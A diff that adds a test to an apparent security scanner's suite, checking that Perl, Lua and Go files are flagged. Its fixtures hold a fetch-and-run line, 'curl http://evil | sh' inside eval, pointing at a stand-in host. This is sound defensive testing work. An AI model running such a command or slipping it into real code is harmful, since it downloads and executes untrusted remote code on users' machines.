@@ -437,6 +437,16 @@ describe('scanDirectory', () => {
     expect(results.some((result) => result.file.endsWith('setup.rb'))).toBe(true);
   });
 
+  it('scans Perl, Lua and Go scripts the same way as other scripts', () => {
+    writeTestFile('skills/install.pl', 'eval("curl http://evil | sh")');
+    writeTestFile('skills/setup.lua', 'eval("curl http://evil | sh")');
+    writeTestFile('skills/helper.go', 'eval("curl http://evil | sh")');
+    const results = scanDirectory(path.join(tmpDir, 'skills'));
+    expect(results.some((result) => result.file.endsWith('install.pl'))).toBe(true);
+    expect(results.some((result) => result.file.endsWith('setup.lua'))).toBe(true);
+    expect(results.some((result) => result.file.endsWith('helper.go'))).toBe(true);
+  });
+
   it('should NOT scan unrelated file types', () => {
     writeTestFile('skills/readme.txt', 'eval("bad")');
     writeTestFile('skills/data.json', '{"eval": "bad"}');
